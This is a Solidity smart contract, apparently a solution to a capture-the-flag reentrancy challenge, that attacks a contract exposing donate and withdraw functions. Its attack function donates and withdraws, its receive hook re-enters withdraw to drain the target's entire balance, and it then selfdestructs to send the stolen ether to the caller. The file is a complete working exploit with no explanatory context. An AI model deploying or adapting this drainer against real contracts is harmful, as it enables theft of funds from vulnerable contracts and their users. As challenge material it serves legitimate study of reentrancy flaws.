pragma solidity ^0.8.0;

interface IReentrance {
    
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract ReentrancyAttack {

    IReentrance private immutable contractToAttck;

    constructor(address _attack) {
        contractToAttck = IReentrance(_attack);
    }

    function attack() external payable {
        //should be 1 wei
        //1000000000000000
        //contractToAttck.donate{value: 3 wei}(address(this));
        contractToAttck.donate{value: msg.value}(address(this));
        contractToAttck.withdraw(msg.value);

        //before destruct ensure that all balance has been drained
        require(address(contractToAttck).balance == 0, "Balance > 0");
        selfdestruct(payable(msg.sender));
    } 


    // fallback() external payable {
    //     uint amount = address(contractToAttck).balance;
    //     if(amount > 0) {
    //         contractToAttck.withdraw(amount);
    //     }
    // }

    //or receive()
    receive() external payable {
        uint amount = min(msg.value, address(contractToAttck).balance);
        if(amount > 0) {
            contractToAttck.withdraw(amount);
        }
    }

    function min(uint x, uint y) private pure returns (uint) {
        if(x > y) return y;
        return x;
    }

}